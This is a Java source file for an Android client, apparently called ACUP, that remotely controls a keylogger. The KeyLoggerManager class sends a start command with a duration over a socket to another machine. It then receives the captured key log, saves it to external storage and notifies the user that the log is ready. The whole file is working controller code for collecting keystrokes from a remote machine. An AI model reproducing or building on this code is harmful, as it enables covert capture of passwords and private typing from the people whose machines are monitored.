package ainaa.acup.manager;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Calendar;
import java.util.GregorianCalendar;

import ainaa.acup.slidingmenu.MainActivity;
import ainna.acup.client.R;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;

public class KeyLoggerManager implements Runnable{

	private Activity activity;
	private String hours;
	private String minutes;
	private boolean isForDownload;
	public KeyLoggerManager(Activity activity, String hours, String minutes, boolean isForDownload) {
		this.activity = activity;
		this.hours = hours;
		this.minutes = minutes;
		this.isForDownload = isForDownload;
	}

	@Override
	public void run() {
		if(isForDownload)
		{
			startKeyloggingWithDownload();
		}
		else
		{
			startKeylogging();
		}
	}
	
	@SuppressLint("NewApi")
	private void startKeylogging() {
		try {
			MainActivity.objectOut.writeObject(""+hours+"_"+minutes);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
				    Intent intent2 = new Intent(activity, ainaa.acup.slidingmenu.Splash.class);
				    PendingIntent pIntent2 = PendingIntent.getActivity(activity, 0, intent2, 0);

				    Notification noti = new Notification.Builder(activity)
				        .setContentTitle("ACUP - Keylogger")
				        .setContentText("Your keylogger started !!!").setSmallIcon(R.drawable.ic_launcher)
				        .setContentIntent(null)
				       // .setStyle(new Notification.BigTextStyle().bigText(file))
				        .addAction(R.drawable.ic_launcher, "ACUP", pIntent2)
				        .build();
				    NotificationManager notificationManager = (NotificationManager) activity.getSystemService(Context.NOTIFICATION_SERVICE);
				    // hide the notification after its selected
				    noti.flags |= Notification.FLAG_AUTO_CANCEL;

				    notificationManager.notify(0, noti);
	}
	@SuppressLint("NewApi")
	private void startKeyloggingWithDownload() {
		try {
			MainActivity.objectOut.writeObject(""+hours+"_"+minutes);
		 File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+File.separator+"ACUP"+File.separator+"Keylogger"+File.separator);
		 directory.mkdirs();
		 directory.setWritable(true);
		 GregorianCalendar gcalendar = new GregorianCalendar();
		 String name = "KeyLgr"+gcalendar.get(Calendar.HOUR_OF_DAY)+"_"+gcalendar.get(Calendar.MINUTE)+"_"+gcalendar.get(Calendar.SECOND)+"_"+gcalendar.get(Calendar.DATE)+"_"+gcalendar.get(Calendar.MONTH)+"_"+gcalendar.get(Calendar.YEAR)+".txt";
		 File file = new File(directory, name);
		 if(!file.exists())
		 {
			 file.createNewFile();
		 }
		 
			FileOutputStream outToFile = new FileOutputStream(file.toString());
	        int bytecount = 2048;
	        byte[] buf = new byte[bytecount];
	        
	        InputStream inputStream = MainActivity.socket.getInputStream();
	        BufferedInputStream bufferedInput = new BufferedInputStream(inputStream, bytecount);
	        int i = 0;
	        int filelength = 0;       
	        while((i = bufferedInput.read(buf, 0, bytecount)) != -1) {
	            filelength += i;
	            outToFile.write(buf, 0, i);
	            outToFile.flush();
	        }
	        if(null != outToFile)
	        {
	        	outToFile.close();
	        	bufferedInput.close();
	        }
	        
	        Intent intent = new Intent();
	        intent.setAction(Intent.ACTION_VIEW);
	        intent.setDataAndType(Uri.parse("file://" + "/sdcard/ACUP/Keylogger/"+file.getName()), "text/*");
		    PendingIntent pIntent = PendingIntent.getActivity(activity, 0, intent, 0);
			    Intent intent2 = new Intent(activity, ainaa.acup.slidingmenu.Splash.class);
			    PendingIntent pIntent2 = PendingIntent.getActivity(activity, 0, intent2, 0);

			    Notification noti = new Notification.Builder(activity)
			        .setContentTitle("ACUP - Keylogger")
			        .setContentText("Your keylogger file downloaded !!!").setSmallIcon(R.drawable.ic_launcher)
			        .setContentIntent(pIntent)
			       .setStyle(new Notification.BigTextStyle().bigText("Touch here to see the key log file !!!"))
			        .addAction(R.drawable.ic_launcher, "ACUP", pIntent2)
			        .build();
			    NotificationManager notificationManager = (NotificationManager) activity.getSystemService(Context.NOTIFICATION_SERVICE);
			    // hide the notification after its selected
			    noti.flags |= Notification.FLAG_AUTO_CANCEL;

			    notificationManager.notify(0, noti);
		} catch (IOException e2) {
			// TODO Auto-generated catch block
			e2.printStackTrace();
		}
	}

}
